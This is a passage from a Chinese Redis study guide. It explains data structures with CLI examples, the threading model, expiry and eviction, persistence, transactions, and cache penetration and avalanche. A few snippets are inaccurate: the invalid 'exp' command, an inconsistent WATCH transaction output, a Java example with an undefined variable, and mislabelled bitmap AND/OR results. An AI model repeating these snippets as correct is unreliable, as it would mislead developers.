由此可见，直接操作缓存能够承受的数据库请求数量是远远大于直接访问数据库的，所以我们可以考虑把数据库中的部分数据转移到缓存中去，这样用户的一部分请求会直接到缓存这里而不用经过数据库。进而，我们也就提高了系统整体的并发。\nRedis 除了做缓存，还能做什么？     分布式锁 ： 通过 Redis 来做分布式锁是一种比较常见的方式。通常情况下，我们都是基于 Redisson 来实现分布式锁。相关阅读：《分布式锁中的王者方案 - Redisson》。 限流 ：一般是通过 Redis + Lua 脚本的方式来实现限流。相关阅读：《我司用了 6 年的 Redis 分布式限流器，可以说是非常厉害了！》。 消息队列 ：Redis 自带的 list 数据结构可以作为一个简单的队列使用。Redis5.0 中增加的 Stream 类型的数据结构更加适合用来做消息队列。它比较类似于 Kafka，有主题和消费组的概念，支持消息持久化以及 ACK 机制。 复杂业务场景 ：通过 Redis 以及 Redis 扩展（比如 Redisson）提供的数据结构，我们可以很方便地完成很多复杂的业务场景比如通过 bitmap 统计活跃用户、通过 sorted set 维护排行榜。 \u0026hellip;\u0026hellip;  Redis 常见数据结构以及使用场景分析    你可以自己本机安装 redis 或者通过 redis 官网提供的在线 redis 环境。\nstring     介绍 ：string 数据结构是简单的 key-value 类型。虽然 Redis 是用 C 语言写的，但是 Redis 并没有使用 C 的字符串表示，而是自己构建了一种 简单动态字符串（simple dynamic string，SDS）。相比于 C 的原生字符串，Redis 的 SDS 不光可以保存文本数据还可以保存二进制数据，并且获取字符串长度复杂度为 O(1)（C 字符串为 O(N)）,除此之外，Redis 的 SDS API 是安全的，不会造成缓冲区溢出。 常用命令： set,get,strlen,exists,decr,incr,setex 等等。 应用场景： 一般常用在需要计数的场景，比如用户的访问次数、热点文章的点赞转发数量等等。  下面我们简单看看它的使用！\n普通字符串的基本操作：\n127.0.0.1:6379\u0026gt; set key value #设置 key-value 类型的值 OK 127.0.0.1:6379\u0026gt; get key # 根据 key 获得对应的 value \u0026#34;value\u0026#34; 127.0.0.1:6379\u0026gt; exists key # 判断某个 key 是否存在 (integer) 1 127.0.0.1:6379\u0026gt; strlen key # 返回 key 所储存的字符串值的长度。 (integer) 5 127.0.0.1:6379\u0026gt; del key # 删除某个 key 对应的值 (integer) 1 127.0.0.1:6379\u0026gt; get key (nil) 批量设置 :\n127.0.0.1:6379\u0026gt; mset key1 value1 key2 value2 # 批量设置 key-value 类型的值 OK 127.0.0.1:6379\u0026gt; mget key1 key2 # 批量获取多个 key 对应的 value 1) \u0026#34;value1\u0026#34; 2) \u0026#34;value2\u0026#34; 计数器（字符串的内容为整数的时候可以使用）：\n127.0.0.1:6379\u0026gt; set number 1 OK 127.0.0.1:6379\u0026gt; incr number # 将 key 中储存的数字值增一 (integer) 2 127.0.0.1:6379\u0026gt; get number \u0026#34;2\u0026#34; 127.0.0.1:6379\u0026gt; decr number # 将 key 中储存的数字值减一 (integer) 1 127.0.0.1:6379\u0026gt; get number \u0026#34;1\u0026#34; 过期（默认为永不过期）：\n127.0.0.1:6379\u0026gt; expire key 60 # 数据在 60s 后过期 (integer) 1 127.0.0.1:6379\u0026gt; setex key 60 value # 数据在 60s 后过期 (setex:[set] + [ex]pire) OK 127.0.0.1:6379\u0026gt; ttl key # 查看数据还有多久过期 (integer) 56 list     介绍 ：list 即是 链表。链表是一种非常常见的数据结构，特点是易于数据元素的插入和删除并且可以灵活调整链表长度，但是链表的随机访问困难。许多高级编程语言都内置了链表的实现比如 Java 中的 LinkedList，但是 C 语言并没有实现链表，所以 Redis 实现了自己的链表数据结构。Redis 的 list 的实现为一个 双向链表，即可以支持反向查找和遍历，更方便操作，不过带来了部分额外的内存开销。 常用命令: rpush,lpop,lpush,rpop,lrange,llen 等。 应用场景: 发布与订阅或者说消息队列、慢查询。  下面我们简单看看它的使用！\n通过 rpush/lpop 实现队列：\n127.0.0.1:6379\u0026gt; rpush myList value1 # 向 list 的头部（右边）添加元素 (integer) 1 127.0.0.1:6379\u0026gt; rpush myList value2 value3 # 向list的头部（最右边）添加多个元素 (integer) 3 127.0.0.1:6379\u0026gt; lpop myList # 将 list的尾部(最左边)元素取出 \u0026#34;value1\u0026#34; 127.0.0.1:6379\u0026gt; lrange myList 0 1 # 查看对应下标的list列表， 0 为 start,1为 end 1) \u0026#34;value2\u0026#34; 2) \u0026#34;value3\u0026#34; 127.0.0.1:6379\u0026gt; lrange myList 0 -1 # 查看列表中的所有元素，-1表示倒数第一 1) \u0026#34;value2\u0026#34; 2) \u0026#34;value3\u0026#34; 通过 rpush/rpop 实现栈：\n127.0.0.1:6379\u0026gt; rpush myList2 value1 value2 value3 (integer) 3 127.0.0.1:6379\u0026gt; rpop myList2 # 将 list的头部(最右边)元素取出 \u0026#34;value3\u0026#34; 我专门画了一个图方便小伙伴们来理解：\n通过 lrange 查看对应下标范围的列表元素：\n127.0.0.1:6379\u0026gt; rpush myList value1 value2 value3 (integer) 3 127.0.0.1:6379\u0026gt; lrange myList 0 1 # 查看对应下标的list列表， 0 为 start,1为 end 1) \u0026#34;value1\u0026#34; 2) \u0026#34;value2\u0026#34; 127.0.0.1:6379\u0026gt; lrange myList 0 -1 # 查看列表中的所有元素，-1表示倒数第一 1) \u0026#34;value1\u0026#34; 2) \u0026#34;value2\u0026#34; 3) \u0026#34;value3\u0026#34; 通过 lrange 命令，你可以基于 list 实现分页查询，性能非常高！\n通过 llen 查看链表长度：\n127.0.0.1:6379\u0026gt; llen myList (integer) 3 hash     介绍 ：hash 类似于 JDK1.8 前的 HashMap，内部实现也差不多(数组 + 链表)。不过，Redis 的 hash 做了更多优化。另外，hash 是一个 string 类型的 field 和 value 的映射表，特别适合用于存储对象，后续操作的时候，你可以直接仅仅修改这个对象中的某个字段的值。 比如我们可以 hash 数据结构来存储用户信息，商品信息等等。 常用命令： hset,hmset,hexists,hget,hgetall,hkeys,hvals 等。 应用场景: 系统中对象数据的存储。  下面我们简单看看它的使用！\n127.0.0.1:6379\u0026gt; hmset userInfoKey name \u0026#34;guide\u0026#34; description \u0026#34;dev\u0026#34; age \u0026#34;24\u0026#34; OK 127.0.0.1:6379\u0026gt; hexists userInfoKey name # 查看 key 对应的 value中指定的字段是否存在。 (integer) 1 127.0.0.1:6379\u0026gt; hget userInfoKey name # 获取存储在哈希表中指定字段的值。 \u0026#34;guide\u0026#34; 127.0.0.1:6379\u0026gt; hget userInfoKey age \u0026#34;24\u0026#34; 127.0.0.1:6379\u0026gt; hgetall userInfoKey # 获取在哈希表中指定 key 的所有字段和值 1) \u0026#34;name\u0026#34; 2) \u0026#34;guide\u0026#34; 3) \u0026#34;description\u0026#34; 4) \u0026#34;dev\u0026#34; 5) \u0026#34;age\u0026#34; 6) \u0026#34;24\u0026#34; 127.0.0.1:6379\u0026gt; hkeys userInfoKey # 获取 key 列表 1) \u0026#34;name\u0026#34; 2) \u0026#34;description\u0026#34; 3) \u0026#34;age\u0026#34; 127.0.0.1:6379\u0026gt; hvals userInfoKey # 获取 value 列表 1) \u0026#34;guide\u0026#34; 2) \u0026#34;dev\u0026#34; 3) \u0026#34;24\u0026#34; 127.0.0.1:6379\u0026gt; hset userInfoKey name \u0026#34;GuideGeGe\u0026#34; # 修改某个字段对应的值 127.0.0.1:6379\u0026gt; hget userInfoKey name \u0026#34;GuideGeGe\u0026#34; set     介绍 ： set 类似于 Java 中的 HashSet 。Redis 中的 set 类型是一种无序集合，集合中的元素没有先后顺序。当你需要存储一个列表数据，又不希望出现重复数据时，set 是一个很好的选择，并且 set 提供了判断某个成员是否在一个 set 集合内的重要接口，这个也是 list 所不能提供的。可以基于 set 轻易实现交集、并集、差集的操作。比如：你可以将一个用户所有的关注人存在一个集合中，将其所有粉丝存在一个集合。Redis 可以非常方便的实现如共同关注、共同粉丝、共同喜好等功能。这个过程也就是求交集的过程。 常用命令： sadd,spop,smembers,sismember,scard,sinterstore,sunion 等。 应用场景: 需要存放的数据不能重复以及需要获取多个数据源交集和并集等场景  下面我们简单看看它的使用！\n127.0.0.1:6379\u0026gt; sadd mySet value1 value2 # 添加元素进去 (integer) 2 127.0.0.1:6379\u0026gt; sadd mySet value1 # 不允许有重复元素 (integer) 0 127.0.0.1:6379\u0026gt; smembers mySet # 查看 set 中所有的元素 1) \u0026#34;value1\u0026#34; 2) \u0026#34;value2\u0026#34; 127.0.0.1:6379\u0026gt; scard mySet # 查看 set 的长度 (integer) 2 127.0.0.1:6379\u0026gt; sismember mySet value1 # 检查某个元素是否存在set 中，只能接收单个元素 (integer) 1 127.0.0.1:6379\u0026gt; sadd mySet2 value2 value3 (integer) 2 127.0.0.1:6379\u0026gt; sinterstore mySet3 mySet mySet2 # 获取 mySet 和 mySet2 的交集并存放在 mySet3 中 (integer) 1 127.0.0.1:6379\u0026gt; smembers mySet3 1) \u0026#34;value2\u0026#34; sorted set     介绍： 和 set 相比，sorted set 增加了一个权重参数 score，使得集合中的元素能够按 score 进行有序排列，还可以通过 score 的范围来获取元素的列表。有点像是 Java 中 HashMap 和 TreeSet 的结合体。 常用命令： zadd,zcard,zscore,zrange,zrevrange,zrem 等。 应用场景： 需要对数据根据某个权重进行排序的场景。比如在直播系统中，实时排行信息包含直播间在线用户列表，各种礼物排行榜，弹幕消息（可以理解为按消息维度的消息排行榜）等信息。  127.0.0.1:6379\u0026gt; zadd myZset 3.0 value1 # 添加元素到 sorted set 中 3.0 为权重 (integer) 1 127.0.0.1:6379\u0026gt; zadd myZset 2.0 value2 1.0 value3 # 一次添加多个元素 (integer) 2 127.0.0.1:6379\u0026gt; zcard myZset # 查看 sorted set 中的元素数量 (integer) 3 127.0.0.1:6379\u0026gt; zscore myZset value1 # 查看某个 value 的权重 \u0026#34;3\u0026#34; 127.0.0.1:6379\u0026gt; zrange myZset 0 -1 # 顺序输出某个范围区间的元素，0 -1 表示输出所有元素 1) \u0026#34;value3\u0026#34; 2) \u0026#34;value2\u0026#34; 3) \u0026#34;value1\u0026#34; 127.0.0.1:6379\u0026gt; zrange myZset 0 1 # 顺序输出某个范围区间的元素，0 为 start 1 为 stop 1) \u0026#34;value3\u0026#34; 2) \u0026#34;value2\u0026#34; 127.0.0.1:6379\u0026gt; zrevrange myZset 0 1 # 逆序输出某个范围区间的元素，0 为 start 1 为 stop 1) \u0026#34;value1\u0026#34; 2) \u0026#34;value2\u0026#34; bitmap     介绍： bitmap 存储的是连续的二进制数字（0 和 1），通过 bitmap, 只需要一个 bit 位来表示某个元素对应的值或者状态，key 就是对应元素本身 。我们知道 8 个 bit 可以组成一个 byte，所以 bitmap 本身会极大的节省储存空间。 常用命令： setbit 、getbit 、bitcount、bitop 应用场景： 适合需要保存状态信息（比如是否签到、是否登录\u0026hellip;）并需要进一步对这些信息进行分析的场景。比如用户签到情况、活跃用户情况、用户行为统计（比如是否点赞过某个视频）。  # SETBIT 会返回之前位的值（默认是 0）这里会生成 7 个位 127.0.0.1:6379\u0026gt; setbit mykey 7 1 (integer) 0 127.0.0.1:6379\u0026gt; setbit mykey 7 0 (integer) 1 127.0.0.1:6379\u0026gt; getbit mykey 7 (integer) 0 127.0.0.1:6379\u0026gt; setbit mykey 6 1 (integer) 0 127.0.0.1:6379\u0026gt; setbit mykey 8 1 (integer) 0 # 通过 bitcount 统计被被设置为 1 的位的数量。 127.0.0.1:6379\u0026gt; bitcount mykey (integer) 2 针对上面提到的一些场景，这里进行进一步说明。\n使用场景一：用户行为分析 很多网站为了分析你的喜好，需要研究你点赞过的内容。\n# 记录你喜欢过 001 号小姐姐 127.0.0.1:6379\u0026gt; setbit beauty_girl_001 uid 1 使用场景二：统计活跃用户\n使用时间作为 key，然后用户 ID 为 offset，如果当日活跃过就设置为 1\n那么我该如何计算某几天/月/年的活跃用户呢(暂且约定，统计时间内只要有一天在线就称为活跃)，有请下一个 redis 的命令\n# 对一个或多个保存二进制位的字符串 key 进行位元操作，并将结果保存到 destkey 上。 # BITOP 命令支持 AND 、 OR 、 NOT 、 XOR 这四种操作中的任意一种参数 BITOP operation destkey key [key ...] 初始化数据：\n127.0.0.1:6379\u0026gt; setbit 20210308 1 1 (integer) 0 127.0.0.1:6379\u0026gt; setbit 20210308 2 1 (integer) 0 127.0.0.1:6379\u0026gt; setbit 20210309 1 1 (integer) 0 统计 20210308~20210309 总活跃用户数: 1\n127.0.0.1:6379\u0026gt; bitop and desk1 20210308 20210309 (integer) 1 127.0.0.1:6379\u0026gt; bitcount desk1 (integer) 1 统计 20210308~20210309 在线活跃用户数: 2\n127.0.0.1:6379\u0026gt; bitop or desk2 20210308 20210309 (integer) 1 127.0.0.1:6379\u0026gt; bitcount desk2 (integer) 2 使用场景三：用户在线状态\n对于获取或者统计用户在线状态，使用 bitmap 是一个节约空间且效率又高的一种方法。\n只需要一个 key，然后用户 ID 为 offset，如果在线就设置为 1，不在线就设置为 0。\nRedis 单线程模型详解    Redis 基于 Reactor 模式来设计开发了自己的一套高效的事件处理模型 （Netty 的线程模型也基于 Reactor 模式，Reactor 模式不愧是高性能 IO 的基石），这套事件处理模型对应的是 Redis 中的文件事件处理器（file event handler）。由于文件事件处理器（file event handler）是单线程方式运行的，所以我们一般都说 Redis 是单线程模型。\n既然是单线程，那怎么监听大量的客户端连接呢？\nRedis 通过IO 多路复用程序 来监听来自客户端的大量连接（或者说是监听多个 socket），它会将感兴趣的事件及类型（读、写）注册到内核中并监听每个事件是否发生。\n这样的好处非常明显： I/O 多路复用技术的使用让 Redis 不需要额外创建多余的线程来监听客户端的大量连接，降低了资源的消耗（和 NIO 中的 Selector 组件很像）。\n另外， Redis 服务器是一个事件驱动程序，服务器需要处理两类事件：1. 文件事件; 2. 时间事件。\n时间事件不需要多花时间了解，我们接触最多的还是 文件事件（客户端进行读取写入等操作，涉及一系列网络通信）。\n《Redis 设计与实现》有一段话是如是介绍文件事件的，我觉得写得挺不错。\n Redis 基于 Reactor 模式开发了自己的网络事件处理器：这个处理器被称为文件事件处理器（file event handler）。文件事件处理器使用 I/O 多路复用（multiplexing）程序来同时监听多个套接字，并根据套接字目前执行的任务来为套接字关联不同的事件处理器。\n当被监听的套接字准备好执行连接应答（accept）、读取（read）、写入（write）、关 闭（close）等操作时，与操作相对应的文件事件就会产生，这时文件事件处理器就会调用套接字之前关联好的事件处理器来处理这些事件。\n虽然文件事件处理器以单线程方式运行，但通过使用 I/O 多路复用程序来监听多个套接字，文件事件处理器既实现了高性能的网络通信模型，又可以很好地与 Redis 服务器中其他同样以单线程方式运行的模块进行对接，这保持了 Redis 内部单线程设计的简单性。\n 可以看出，文件事件处理器（file event handler）主要是包含 4 个部分：\n 多个 socket（客户端连接） IO 多路复用程序（支持多个客户端连接的关键） 文件事件分派器（将 socket 关联到相应的事件处理器） 事件处理器（连接应答处理器、命令请求处理器、命令回复处理器）  《Redis设计与实现：12章》\nRedis 没有使用多线程？为什么不使用多线程？    虽然说 Redis 是单线程模型，但是，实际上，Redis 在 4.0 之后的版本中就已经加入了对多线程的支持。\n不过，Redis 4.0 增加的多线程主要是针对一些大键值对的删除操作的命令，使用这些命令就会使用主处理之外的其他线程来“异步处理”。\n大体上来说，Redis 6.0 之前主要还是单线程处理。\n那，Redis6.0 之前 为什么不使用多线程？\n我觉得主要原因有下面 3 个：\n 单线程编程容易并且更容易维护； Redis 的性能瓶颈不在 CPU ，主要在内存和网络； 多线程就会存在死锁、线程上下文切换等问题，甚至会影响性能。  Redis6.0 之后为何引入了多线程？    Redis6.0 引入多线程主要是为了提高网络 IO 读写性能，因为这个算是 Redis 中的一个性能瓶颈（Redis 的瓶颈主要受限于内存和网络）。\n虽然，Redis6.0 引入了多线程，但是 Redis 的多线程只是在网络数据的读写这类耗时操作上使用了，执行命令仍然是单线程顺序执行。因此，你也不需要担心线程安全问题。\nRedis6.0 的多线程默认是禁用的，只使用主线程。如需开启需要修改 redis 配置文件 redis.conf ：\nio-threads-do-reads yes 开启多线程后，还需要设置线程数，否则是不生效的。同样需要修改 redis 配置文件 redis.conf :\nio-threads 4 #官网建议4核的机器建议设置为2或3个线程，8核的建议设置为6个线程 推荐阅读：\n Redis 6.0 新特性-多线程连环 13 问！ 为什么 Redis 选择单线程模型  Redis 给缓存数据设置过期时间有啥用？    一般情况下，我们设置保存的缓存数据的时候都会设置一个过期时间。为什么呢？\n因为内存是有限的，如果缓存中的所有数据都是一直保存的话，分分钟直接 Out of memory。\nRedis 自带了给缓存数据设置过期时间的功能，比如：\n127.0.0.1:6379\u0026gt; exp key 60 # 数据在 60s 后过期 (integer) 1 127.0.0.1:6379\u0026gt; setex key 60 value # 数据在 60s 后过期 (setex:[set] + [ex]pire) OK 127.0.0.1:6379\u0026gt; ttl key # 查看数据还有多久过期 (integer) 56 注意：**Redis 中除了字符串类型有自己独有设置过期时间的命令 setex 外，其他方法都需要依靠 expire 命令来设置过期时间 。另外， persist 命令可以移除一个键的过期时间。 **\n过期时间除了有助于缓解内存的消耗，还有什么其他用么？\n很多时候，我们的业务场景就是需要某个数据只在某一时间段内存在，比如我们的短信验证码可能只在 1 分钟内有效，用户登录的 token 可能只在 1 天内有效。\n如果使用传统的数据库来处理的话，一般都是自己判断过期，这样更麻烦并且性能要差很多。\nRedis 是如何判断数据是否过期的呢？    Redis 通过一个叫做过期字典（可以看作是 hash 表）来保存数据过期的时间。过期字典的键指向 Redis 数据库中的某个 key(键)，过期字典的值是一个 long long 类型的整数，这个整数保存了 key 所指向的数据库键的过期时间（毫秒精度的 UNIX 时间戳）。\n过期字典是存储在 redisDb 这个结构里的：\ntypedef struct redisDb { ... dict *dict; //数据库键空间,保存着数据库中所有键值对  dict *expires // 过期字典,保存着键的过期时间  ... } redisDb; 过期的数据的删除策略了解么？    如果假设你设置了一批 key 只能存活 1 分钟，那么 1 分钟后，Redis 是怎么对这批 key 进行删除的呢？\n常用的过期数据的删除策略就两个（重要！自己造缓存轮子的时候需要格外考虑的东西）：\n 惰性删除 ：只会在取出 key 的时候才对数据进行过期检查。这样对 CPU 最友好，但是可能会造成太多过期 key 没有被删除。 定期删除 ： 每隔一段时间抽取一批 key 执行删除过期 key 操作。并且，Redis 底层会通过限制删除操作执行的时长和频率来减少删除操作对 CPU 时间的影响。  定期删除对内存更加友好，惰性删除对 CPU 更加友好。两者各有千秋，所以 Redis 采用的是 定期删除+惰性/懒汉式删除 。\n但是，仅仅通过给 key 设置过期时间还是有问题的。因为还是可能存在定期删除和惰性删除漏掉了很多过期 key 的情况。这样就导致大量过期 key 堆积在内存里，然后就 Out of memory 了。\n怎么解决这个问题呢？答案就是：Redis 内存淘汰机制。\nRedis 内存淘汰机制了解么？     相关问题：MySQL 里有 2000w 数据，Redis 中只存 20w 的数据，如何保证 Redis 中的数据都是热点数据?\n Redis 提供 6 种数据淘汰策略：\n volatile-lru（least recently used）：从已设置过期时间的数据集（server.db[i].expires）中挑选最近最少使用的数据淘汰 volatile-ttl：从已设置过期时间的数据集（server.db[i].expires）中挑选将要过期的数据淘汰 volatile-random：从已设置过期时间的数据集（server.db[i].expires）中任意选择数据淘汰 allkeys-lru（least recently used）：当内存不足以容纳新写入数据时，在键空间中，移除最近最少使用的 key（这个是最常用的） allkeys-random：从数据集（server.db[i].dict）中任意选择数据淘汰 no-eviction：禁止驱逐数据，也就是说当内存不足以容纳新写入数据时，新写入操作会报错。这个应该没人使用吧！  4.0 版本后增加以下两种：\nvolatile-lfu（least frequently used）：从已设置过期时间的数据集（server.db[i].expires）中挑选最不经常使用的数据淘汰 allkeys-lfu（least frequently used）：当内存不足以容纳新写入数据时，在键空间中，移除最不经常使用的 key  Redis 持久化机制(怎么保证 Redis 挂掉之后再重启数据可以进行恢复)    很多时候我们需要持久化数据也就是将内存中的数据写入到硬盘里面，大部分原因是为了之后重用数据（比如重启机器、机器故障之后恢复数据），或者是为了防止系统故障而将数据备份到一个远程位置。\nRedis 不同于 Memcached 的很重要一点就是，Redis 支持持久化，而且支持两种不同的持久化操作。Redis 的一种持久化方式叫快照（snapshotting，RDB），另一种方式是只追加文件（append-only file, AOF）。这两种方法各有千秋，下面我会详细这两种持久化方法是什么，怎么用，如何选择适合自己的持久化方法。\n快照（snapshotting）持久化（RDB）\nRedis 可以通过创建快照来获得存储在内存里面的数据在某个时间点上的副本。Redis 创建快照之后，可以对快照进行备份，可以将快照复制到其他服务器从而创建具有相同数据的服务器副本（Redis 主从结构，主要用来提高 Redis 性能），还可以将快照留在原地以便重启服务器的时候使用。\n快照持久化是 Redis 默认采用的持久化方式，在 Redis.conf 配置文件中默认有此下配置：\nsave 900 1 #在900秒(15分钟)之后，如果至少有1个key发生变化，Redis就会自动触发BGSAVE命令创建快照。 save 300 10 #在300秒(5分钟)之后，如果至少有10个key发生变化，Redis就会自动触发BGSAVE命令创建快照。 save 60 10000 #在60秒(1分钟)之后，如果至少有10000个key发生变化，Redis就会自动触发BGSAVE命令创建快照。 AOF（append-only file）持久化\n与快照持久化相比，AOF 持久化的实时性更好，因此已成为主流的持久化方案。默认情况下 Redis 没有开启 AOF（append only file）方式的持久化，可以通过 appendonly 参数开启：\nappendonly yes 开启 AOF 持久化后每执行一条会更改 Redis 中的数据的命令，Redis 就会将该命令写入到内存缓存 server.aof_buf 中，然后再根据 appendfsync 配置来决定何时将其同步到硬盘中的 AOF 文件。\nAOF 文件的保存位置和 RDB 文件的位置相同，都是通过 dir 参数设置的，默认的文件名是 appendonly.aof。\n在 Redis 的配置文件中存在三种不同的 AOF 持久化方式，它们分别是：\nappendfsync always #每次有数据修改发生时都会写入AOF文件,这样会严重降低Redis的速度 appendfsync everysec #每秒钟同步一次，显示地将多个写命令同步到硬盘 appendfsync no #让操作系统决定何时进行同步 为了兼顾数据和写入性能，用户可以考虑 appendfsync everysec 选项 ，让 Redis 每秒同步一次 AOF 文件，Redis 性能几乎没受到任何影响。而且这样即使出现系统崩溃，用户最多只会丢失一秒之内产生的数据。当硬盘忙于执行写入操作的时候，Redis 还会优雅的放慢自己的速度以便适应硬盘的最大写入速度。\n相关 issue ：783：Redis 的 AOF 方式\n拓展：Redis 4.0 对于持久化机制的优化\nRedis 4.0 开始支持 RDB 和 AOF 的混合持久化（默认关闭，可以通过配置项 aof-use-rdb-preamble 开启）。\n如果把混合持久化打开，AOF 重写的时候就直接把 RDB 的内容写到 AOF 文件开头。这样做的好处是可以结合 RDB 和 AOF 的优点, 快速加载同时避免丢失过多的数据。当然缺点也是有的， AOF 里面的 RDB 部分是压缩格式不再是 AOF 格式，可读性较差。\n官方文档地址：https://redis.io/topics/persistence\n补充内容：AOF 重写\nAOF 重写可以产生一个新的 AOF 文件，这个新的 AOF 文件和原有的 AOF 文件所保存的数据库状态一样，但体积更小。\nAOF 重写是一个有歧义的名字，该功能是通过读取数据库中的键值对来实现的，程序无须对现有 AOF 文件进行任何读入、分析或者写入操作。\n在执行 BGREWRITEAOF 命令时，Redis 服务器会维护一个 AOF 重写缓冲区，该缓冲区会在子进程创建新 AOF 文件期间，记录服务器执行的所有写命令。当子进程完成创建新 AOF 文件的工作之后，服务器会将重写缓冲区中的所有内容追加到新 AOF 文件的末尾，使得新旧两个 AOF 文件所保存的数据库状态一致。最后，服务器用新的 AOF 文件替换旧的 AOF 文件，以此来完成 AOF 文件重写操作。\nRedis 事务    Redis 可以通过 MULTI，EXEC，DISCARD 和 WATCH 等命令来实现事务(transaction)功能。\n\u0026gt; MULTI OK \u0026gt; SET USER \u0026#34;Guide哥\u0026#34; QUEUED \u0026gt; GET USER QUEUED \u0026gt; EXEC 1) OK 2) \u0026#34;Guide哥\u0026#34; 使用 MULTI 命令后可以输入多个命令。Redis 不会立即执行这些命令，而是将它们放到队列，当调用了 EXEC 命令将执行所有命令。\n这个过程是这样的：\n 开始事务（MULTI）。 命令入队(批量操作 Redis 的命令，先进先出（FIFO）的顺序执行)。 执行事务(EXEC)。  你也可以通过 DISCARD 命令取消一个事务，它会清空事务队列中保存的所有命令。\n\u0026gt; MULTI OK \u0026gt; SET USER \u0026#34;Guide哥\u0026#34; QUEUED \u0026gt; GET USER QUEUED \u0026gt; DISCARD OK WATCH 命令用于监听指定的键，当调用 EXEC 命令执行事务时，如果一个被 WATCH 命令监视的键被修改的话，整个事务都不会执行，直接返回失败。\n\u0026gt; WATCH USER OK \u0026gt; MULTI \u0026gt; SET USER \u0026#34;Guide哥\u0026#34; OK \u0026gt; GET USER Guide哥 \u0026gt; EXEC ERR EXEC without MULTI Redis 官网相关介绍 https://redis.io/topics/transactions 如下：\n但是，Redis 的事务和我们平时理解的关系型数据库的事务不同。我们知道事务具有四大特性： 1. 原子性，2. 隔离性，3. 持久性，4. 一致性。\n 原子性（Atomicity）： 事务是最小的执行单位，不允许分割。事务的原子性确保动作要么全部完成，要么完全不起作用； 隔离性（Isolation）： 并发访问数据库时，一个用户的事务不被其他事务所干扰，各并发事务之间数据库是独立的； 持久性（Durability）： 一个事务被提交之后。它对数据库中数据的改变是持久的，即使数据库发生故障也不应该对其有任何影响。 一致性（Consistency）： 执行事务前后，数据保持一致，多个事务对同一个数据读取的结果是相同的；  Redis 是不支持 roll back 的，因而不满足原子性的（而且不满足持久性）。\nRedis 官网也解释了自己为啥不支持回滚。简单来说就是 Redis 开发者们觉得没必要支持回滚，这样更简单便捷并且性能更好。Redis 开发者觉得即使命令执行错误也应该在开发过程中就被发现而不是生产过程中。\n你可以将 Redis 中的事务就理解为 ：Redis 事务提供了一种将多个命令请求打包的功能。然后，再按顺序执行打包的所有命令，并且不会被中途打断。\n相关 issue :\n issue452: 关于 Redis 事务不满足原子性的问题 。 Issue491:关于 redis 没有事务回滚？  缓存穿透    什么是缓存穿透？    缓存穿透说简单点就是大量请求的 key 根本不存在于缓存中，导致请求直接到了数据库上，根本没有经过缓存这一层。举个例子：某个黑客故意制造我们缓存中不存在的 key 发起大量请求，导致大量请求落到数据库。\n缓存穿透情况的处理流程是怎样的？    如下图所示，用户的请求最终都要跑到数据库中查询一遍。\n有哪些解决办法？    最基本的就是首先做好参数校验，一些不合法的参数请求直接抛出异常信息返回给客户端。比如查询的数据库 id 不能小于 0、传入的邮箱格式不对的时候直接返回错误消息给客户端等等。\n1）缓存无效 key\n如果缓存和数据库都查不到某个 key 的数据就写一个到 Redis 中去并设置过期时间，具体命令如下： SET key value EX 10086 。这种方式可以解决请求的 key 变化不频繁的情况，如果黑客恶意攻击，每次构建不同的请求 key，会导致 Redis 中缓存大量无效的 key 。很明显，这种方案并不能从根本上解决此问题。如果非要用这种方式来解决穿透问题的话，尽量将无效的 key 的过期时间设置短一点比如 1 分钟。\n另外，这里多说一嘴，一般情况下我们是这样设计 key 的： 表名:列名:主键名:主键值 。\n如果用 Java 代码展示的话，差不多是下面这样的：\npublic Object getObjectInclNullById(Integer id) { // 从缓存中获取数据  Object cacheValue = cache.get(id); // 缓存为空  if (cacheValue == null) { // 从数据库中获取  Object storageValue = storage.get(key); // 缓存空对象  cache.set(key, storageValue); // 如果存储数据为空，需要设置一个过期时间(300秒)  if (storageValue == null) { // 必须设置过期时间，否则有被攻击的风险  cache.expire(key, 60 * 5); } return storageValue; } return cacheValue; } 2）布隆过滤器\n布隆过滤器是一个非常神奇的数据结构，通过它我们可以非常方便地判断一个给定数据是否存在于海量数据中。我们需要的就是判断 key 是否合法，有没有感觉布隆过滤器就是我们想要找的那个“人”。\n具体是这样做的：把所有可能存在的请求的值都存放在布隆过滤器中，当用户请求过来，先判断用户发来的请求的值是否存在于布隆过滤器中。不存在的话，直接返回请求参数错误信息给客户端，存在的话才会走下面的流程。\n加入布隆过滤器之后的缓存处理流程图如下。\n但是，需要注意的是布隆过滤器可能会存在误判的情况。总结来说就是： 布隆过滤器说某个元素存在，小概率会误判。布隆过滤器说某个元素不在，那么这个元素一定不在。\n为什么会出现误判的情况呢? 我们还要从布隆过滤器的原理来说！\n我们先来看一下，当一个元素加入布隆过滤器中的时候，会进行哪些操作：\n 使用布隆过滤器中的哈希函数对元素值进行计算，得到哈希值（有几个哈希函数得到几个哈希值）。 根据得到的哈希值，在位数组中把对应下标的值置为 1。  我们再来看一下，当我们需要判断一个元素是否存在于布隆过滤器的时候，会进行哪些操作：\n 对给定元素再次进行相同的哈希计算； 得到值之后判断位数组中的每个元素是否都为 1，如果值都为 1，那么说明这个值在布隆过滤器中，如果存在一个值不为 1，说明该元素不在布隆过滤器中。  然后，一定会出现这样一种情况：不同的字符串可能哈希出来的位置相同。 （可以适当增加位数组大小或者调整我们的哈希函数来降低概率）\n更多关于布隆过滤器的内容可以看我的这篇原创：《不了解布隆过滤器？一文给你整的明明白白！》 ，强烈推荐，个人感觉网上应该找不到总结的这么明明白白的文章了。\n缓存雪崩    什么是缓存雪崩？    我发现缓存雪崩这名字起的有点意思，哈哈。\n实际上，缓存雪崩描述的就是这样一个简单的场景：缓存在同一时间大面积的失效，后面的请求都直接落到了数据库上，造成数据库短时间内承受大量请求。 这就好比雪崩一样，摧枯拉朽之势，数据库的压力可想而知，可能直接就被这么多请求弄宕机了。\n举个例子：系统的缓存模块出了问题比如宕机导致不可用。造成系统的所有访问，都要走数据库。\n还有一种缓存雪崩的场景是：有一些被大量访问数据（热点缓存）在某一时刻大面积失效，导致对应的请求直接落到了数据库上。 这样的情况，有下面几种解决办法：\n举个例子 ：秒杀开始 12 个小时之前，我们统一存放了一批商品到 Redis 中，设置的缓存过期时间也是 12 个小时，那么秒杀开始的时候，这些秒杀的商品的访问直接就失效了。导致的情况就是，相应的请求直接就落到了数据库上，就像雪崩一样可怕。\n有哪些解决办法？    针对 Redis 服务不可用的情况：\n 采用 Redis 集群，避免单机出现问题整个缓存服务都没办法使用。 限流，避免同时处理大量的请求。  针对热点缓存失效的情况：\n 设置不同的失效时间比如随机设置缓存的失效时间。 缓存永不失效。  如何保证缓存和数据库数据的一致性？    细说的话可以扯很多，但是我觉得其实没太大必要（小声 